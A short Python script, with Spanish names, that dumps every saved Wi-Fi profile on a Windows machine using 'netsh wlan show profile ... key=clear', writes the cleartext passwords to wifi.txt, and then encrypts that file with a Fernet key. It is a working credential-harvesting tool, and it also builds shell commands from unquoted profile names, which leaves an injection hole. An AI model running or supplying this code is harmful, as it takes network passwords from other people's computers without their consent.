import os
from cryptography.fernet import Fernet



def cargar_clave():
    return open("clave.key", "rb").read()

def procesoSacarClavesWifi():

    cmd = "netsh wlan show profile"
    resultado = os.popen(cmd).read().split("\n")

    nombres_red = []
    for line in resultado:
        if "Perfil de todos los usuarios" in line:
            nombre_red = line.split(":")[1].strip()
            nombres_red.append(nombre_red)
    print(nombres_red)         

    miarchivo = open("wifi.txt", "a")

    for red in nombres_red:
        cmd2 = "netsh wlan show profile " + red + " key=clear"
        resultado2 = os.popen(cmd2)
        miarchivo.write(resultado2.read())

    miarchivo.close()


def encriptar_archivo(nombre_archivo, clave):
    fernet = Fernet(clave)
    with open(nombre_archivo, "rb") as archivo_original:
        datos_originales = archivo_original.read()
    datos_encriptados = fernet.encrypt(datos_originales)
    with open(nombre_archivo + ".encrypted", "wb") as archivo_encriptado:
        archivo_encriptado.write(datos_encriptados)



procesoSacarClavesWifi()
clave= cargar_clave()
encriptar_archivo("wifi.txt", clave)
